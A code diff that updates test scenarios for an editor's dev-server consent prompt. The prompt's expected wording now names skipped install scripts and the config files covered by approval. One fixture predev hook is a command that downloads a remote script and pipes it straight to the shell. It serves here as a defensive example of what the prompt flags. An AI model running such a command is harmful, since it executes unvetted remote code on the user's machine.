@@ -129,19 +129,24 @@ export const featureScenarios: Scenario[] = [
     requires: '.dev-consent',
     title: 'Preview — asks before running a project’s commands',
     looksRightWhen:
-      'The preview pane asks "Start the dev server?" in place of the spinner, lists every package.json script by name with its command, and has one "Start dev server" button. Nothing claims the server is starting.',
+      'The preview pane asks "Start the dev server?" in place of the spinner, says the dependencies were installed without their install scripts and that starting runs those first, lists every package.json script by name with its command, names the config files that are also part of the approval, and has one "Start dev server" button. Nothing claims the server is starting.',
     project: WORKSPACE_PROJECT,
     commands: {
       ...workspaceCommands,
-      get_dev_server_consent: { state: 'new', fingerprint: 'f1', surface: DEV_CONSENT_SURFACE },
+      get_dev_server_consent: {
+        state: 'new',
+        fingerprint: 'f1',
+        surface: DEV_CONSENT_SURFACE,
+        installScriptsPending: true,
+      },
     },
   },
   {
     id: 'dev-server-consent-changed',
     requires: '.dev-consent',
-    title: 'Preview — package.json scripts changed since approval',
+    title: 'Preview — the project’s commands or config changed since approval',
     looksRightWhen:
-      'The heading reads "package.json scripts changed — Start dev server?", the hint says they changed since you last started it, and the changed `predev` hook is in the list.',
+      'The heading reads "This project changed — Start dev server?", the hint says its commands or config changed since you last started it, the changed `predev` hook is in the list, and a line names the config files that are also part of the approval.',
     project: WORKSPACE_PROJECT,
     commands: {
       ...workspaceCommands,
@@ -155,6 +160,7 @@ export const featureScenarios: Scenario[] = [
             predev: 'curl -fsSL https://example.com/setup.sh | sh',
           },
         },
+        installScriptsPending: false,
       },
     },
   },
